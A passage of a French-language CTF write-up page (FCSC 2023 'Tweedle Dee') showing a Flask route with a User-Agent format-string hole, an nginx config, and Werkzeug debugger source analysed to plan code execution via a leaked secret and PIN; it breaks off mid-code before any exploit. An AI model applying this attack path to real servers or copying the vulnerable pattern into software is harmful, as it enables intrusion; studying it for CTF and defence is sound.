@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>FCSC 2023 Tweedle Dee Web - LexterSecurity</title><meta name="Description" content="Fun research blog "><meta property="og:title" content="FCSC 2023 Tweedle Dee Web" />
+<meta property="og:description" content="Tweedle-Dee Analyse du code @app.route(&#34;/&#34;) def hello_agent(secret=None): ua = request.user_agent return render_template(&#34;index.html&#34;, msg=f&#34;Hello {ua}&#34;.format(ua=ua)) worker_processes 4; events { use epoll; worker_connections 128; } http { charset utf-8; access_log /dev/stdout combined; error_log /dev/stdout debug; real_ip_header X-Forwarded-For; real_ip_recursive on; set_real_ip_from 0.0.0.0/0; server { listen 2201; server_name _; location /console { return 403 &#34;Bye&#34;; } location @error { return 500 &#34;Bye&#34;; } location / { error_page 500 503 @error; proxy_intercept_errors on; proxy_pass http://app:5000; } } } Ayant fait le challenge Tweedle Dum je comprend rapidement que le code de la route n&rsquo;a pas changé et je n&rsquo;ai accès qu&rsquo;a une format string." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/fcsc-2023-tweedle-dee-web/" /><meta property="og:image" content="http://example.org/img/logo.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-04T04:31:31+02:00" />
+<meta property="article:modified_time" content="2023-09-04T04:31:31+02:00" /><meta property="og:site_name" content="LexterSecurity - Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/img/logo.jpg"/>
+
+<meta name="twitter:title" content="FCSC 2023 Tweedle Dee Web"/>
+<meta name="twitter:description" content="Tweedle-Dee Analyse du code @app.route(&#34;/&#34;) def hello_agent(secret=None): ua = request.user_agent return render_template(&#34;index.html&#34;, msg=f&#34;Hello {ua}&#34;.format(ua=ua)) worker_processes 4; events { use epoll; worker_connections 128; } http { charset utf-8; access_log /dev/stdout combined; error_log /dev/stdout debug; real_ip_header X-Forwarded-For; real_ip_recursive on; set_real_ip_from 0.0.0.0/0; server { listen 2201; server_name _; location /console { return 403 &#34;Bye&#34;; } location @error { return 500 &#34;Bye&#34;; } location / { error_page 500 503 @error; proxy_intercept_errors on; proxy_pass http://app:5000; } } } Ayant fait le challenge Tweedle Dum je comprend rapidement que le code de la route n&rsquo;a pas changé et je n&rsquo;ai accès qu&rsquo;a une format string."/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/fcsc-2023-tweedle-dee-web/" /><link rel="prev" href="http://example.org/posts/fcsc-2023-peculiar-caterpillar-web/" /><link rel="next" href="http://example.org/posts/config-loader-hacksecureims/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "FCSC 2023 Tweedle Dee Web",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/fcsc-2023-tweedle-dee-web\/"
+        },"genre": "posts","wordcount":  1395 ,
+        "url": "http:\/\/example.org\/posts\/fcsc-2023-tweedle-dee-web\/","datePublished": "2023-09-04T04:31:31+02:00","dateModified": "2023-09-04T04:31:31+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Lxt3h"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="LexterSecurity"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/bryton.png"
+        data-srcset="/img/bryton.png, /img/bryton.png 1.5x, /img/bryton.png 2x"
+        data-sizes="auto"
+        alt="/img/bryton.png"
+        title="/img/bryton.png" width="128" height="128" />LexterSecurity</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="LexterSecurity"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/bryton.png"
+        data-srcset="/img/bryton.png, /img/bryton.png 1.5x, /img/bryton.png 2x"
+        data-sizes="auto"
+        alt="/img/bryton.png"
+        title="/img/bryton.png" width="128" height="128" />LexterSecurity</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">FCSC 2023 Tweedle Dee Web</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Lxt3h</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-09-04">2023-09-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1395 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#analyse-du-code">Analyse du code</a></li>
+    <li><a href="#analyse-du-code-de-werkzeug">Analyse du code de werkzeug</a>
+      <ul>
+        <li><a href="#selfpin_auth">self.pin_auth()</a></li>
+      </ul>
+    </li>
+    <li><a href="#selfexecute_command">self.execute_command()</a></li>
+    <li><a href="#fuite-des-données">Fuite des données</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#remerciement">Remerciement</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="tweedle-dee">Tweedle-Dee</h1>
+<h2 id="analyse-du-code">Analyse du code</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span>  <span class="nf">hello_agent</span><span class="p">(</span><span class="n">secret</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">ua</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">user_agent</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;Hello </span><span class="si">{</span><span class="n">ua</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ua</span><span class="o">=</span><span class="n">ua</span><span class="p">))</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="k">worker_processes</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">events</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">use</span> <span class="s">epoll</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">worker_connections</span> <span class="mi">128</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">http</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">charset</span> <span class="s">utf-8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kn">access_log</span> <span class="s">/dev/stdout</span> <span class="s">combined</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">error_log</span> <span class="s">/dev/stdout</span> <span class="s">debug</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kn">real_ip_header</span> <span class="s">X-Forwarded-For</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">real_ip_recursive</span> <span class="no">on</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">set_real_ip_from</span> <span class="mi">0</span><span class="s">.0.0.0/0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kn">server</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="mi">2201</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/console</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kn">return</span> <span class="mi">403</span> <span class="s">&#34;Bye&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">@error</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kn">return</span> <span class="mi">500</span> <span class="s">&#34;Bye&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kn">error_page</span> <span class="mi">500</span> <span class="mi">503</span> <span class="s">@error</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kn">proxy_intercept_errors</span> <span class="no">on</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kn">proxy_pass</span> <span class="s">http://app:5000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Ayant fait le challenge Tweedle Dum je comprend rapidement que le code de la route n&rsquo;a pas changé et je n&rsquo;ai accès qu&rsquo;a une format string. La nouveauté de ce challenge est la configuration nginx. En effet nous n&rsquo;allons pas pouvoir accéder à /console et nous ne pouvons pas voir les erreurs de debug, tout simplement parce que les erreurs et la route /console sont bloqués.</p>
+<p>Nous allons donc devoir trouver un moyen de RCE seulement via des fuites de variables du package werkzeug. Avant tout je vais devoir lire le code source de werkzeug pour savoir qu&rsquo;est ce que je dois faire fuiter pour exécuter des commandes.</p>
+<h2 id="analyse-du-code-de-werkzeug">Analyse du code de werkzeug</h2>
+<p>Durant la lecture du module de debug de werkzeug j&rsquo;ai trouvé la fameuse fonction <code>__call__</code>. Cette fonction est exécuté depuis chaque route du site en flask.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="fm">__call__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span> <span class="n">environ</span><span class="p">:</span> <span class="n">WSGIEnvironment</span><span class="p">,</span> <span class="n">start_response</span><span class="p">:</span> <span class="n">StartResponse</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">Iterable</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Dispatch the requests.&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># important: don&#39;t ever access a function here that reads the incoming</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># form data!  Otherwise the application won&#39;t have access to that data</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># any more!</span>
+</span></span><span class="line"><span class="cl">        <span class="n">request</span> <span class="o">=</span> <span class="n">Request</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">debug_application</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;__debugger__&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;yes&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;cmd&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">arg</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;f&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">secret</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;s&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">frame</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">frames</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;frm&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">))</span>  <span class="c1"># type: ignore</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&#34;resource&#34;</span> <span class="ow">and</span> <span class="n">arg</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_resource</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">arg</span><span class="p">)</span>  <span class="c1"># type: ignore</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&#34;pinauth&#34;</span> <span class="ow">and</span> <span class="n">secret</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">secret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pin_auth</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>  <span class="c1"># type: ignore</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&#34;printpin&#34;</span> <span class="ow">and</span> <span class="n">secret</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">secret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">log_pin_request</span><span class="p">()</span>  <span class="c1"># type: ignore</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">evalex</span>
+</span></span><span class="line"><span class="cl">                <span class="ow">and</span> <span class="n">cmd</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">                <span class="ow">and</span> <span class="n">frame</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">                <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">secret</span> <span class="o">==</span> <span class="n">secret</span>
+</span></span><span class="line"><span class="cl">                <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">check_pin_trust</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">frame</span><span class="p">)</span>  <span class="c1"># type: ignore</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">evalex</span>
+</span></span><span class="line"><span class="cl">            <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">console_path</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">            <span class="ow">and</span> <span class="n">request</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">console_path</span>
+</span></span><span class="line"><span class="cl">        <span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">display_console</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>  <span class="c1"># type: ignore</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="n">environ</span><span class="p">,</span> <span class="n">start_response</span><span class="p">)</span>
+</span></span></code></pre></div><p>Le fonctionnement de cette fonction est simple. Tout d&rsquo;abord il va prendre la requête envoyé par le client et va regarder si il existe un paramètre <strong>GET</strong> de type <code>__debugger__</code> qui est set à <code>yes</code>, si tel est le cas il va vérifier l&rsquo;existence de certains paramètre <strong>GET</strong> et selon les paramètres il va changer sa réponse par le résultat de la fonction qui est associé au paramètre. Ici il y a deux fonction qui nous intéresse. Tout d&rsquo;abord il y a <code>pinauth</code> et il y a la dernière option qui nous indique en effet que si nous mettons comme paramètre, <code>cmd</code>,<code>frame</code>,<code>secret</code> et <code>pin</code> il va exécuter une commande dans la frame qui lui est passé en paramètre.</p>
+<h3 id="selfpin_auth">self.pin_auth()</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&#34;pinauth&#34;</span> <span class="ow">and</span> <span class="n">secret</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">secret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pin_auth</span><span class="p">(</span><span class="n">request</span><span class="p">)</span> <span class="c1"># type: ignore</span>
+</span></span></code></pre></div><p>Comme on peut le voir ci-dessus cette commande nous dit que si l&rsquo;on met en paramètre le bon secret, nous allons pouvoir checker si le pin d&rsquo;entrée est valide.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pin_auth</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Authenticates with the pin.&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exhausted</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="n">auth</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="n">trust</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">check_pin_trust</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pin</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">cast</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">pin</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># If the trust return value is `None` it means that the cookie is</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># set but the stored pin hash value is bad.  This means that the</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># pin was changed.  In this case we count a bad auth and unset the</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># cookie.  This way it becomes harder to guess the cookie name</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># instead of the pin as we still count up failures.</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bad_cookie</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">trust</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">_fail_pin_auth</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bad_cookie</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># If we&#39;re trusted, we&#39;re authenticated.</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">trust</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">auth</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># If we failed too many times, then we&#39;re locked out.</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">_failed_pin_auth</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exhausted</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Otherwise go through pin based authentication</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">entered_pin</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&#34;pin&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">entered_pin</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="n">pin</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_failed_pin_auth</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">                <span class="n">auth</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_fail_pin_auth</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;auth&#34;</span><span class="p">:</span> <span class="n">auth</span><span class="p">,</span> <span class="s2">&#34;exhausted&#34;</span><span class="p">:</span> <span class="n">exhausted</span><span class="p">}),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">mimetype</span><span class="o">=</span><span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">auth</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rv</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">pin_cookie_name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">hash_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">httponly</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">samesite</span><span class="o">=</span><span class="s2">&#34;Strict&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">secure</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">is_secure</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">bad_cookie</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rv</span><span class="o">.</span><span class="n">delete_cookie</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pin_cookie_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> 
+</span></span></code></pre></div><p>Pour expliquer rapidement, ce script va pouvoir être appelé depuis la commande <code>pinauth</code> et seulement si le secret mit dans les paramètres <strong>GET</strong> est valide.
+On peut voir dans la fonction qu&rsquo;il va simplement prendre le <code>pin</code> valide et le comparer avec le <code>pin</code> entrée depuis le paramètre <strong>GET</strong> <code>pin</code>, si tel est le cas il va nous set un cookie qui validera l&rsquo;authentification.</p>
+<h2 id="selfexecute_command">self.execute_command()</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"> <span class="k">elif</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">evalex</span>
+</span></span><span class="line"><span class="cl">                <span class="ow">and</span> <span class="n">cmd</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">                <span class="ow">and</span> <span class="n">frame</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">                <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">secret</span> <span class="o">==</span> <span class="n">secret</span>
+</span></span><span class="line"><span class="cl">                <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">check_pin_trust</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span>
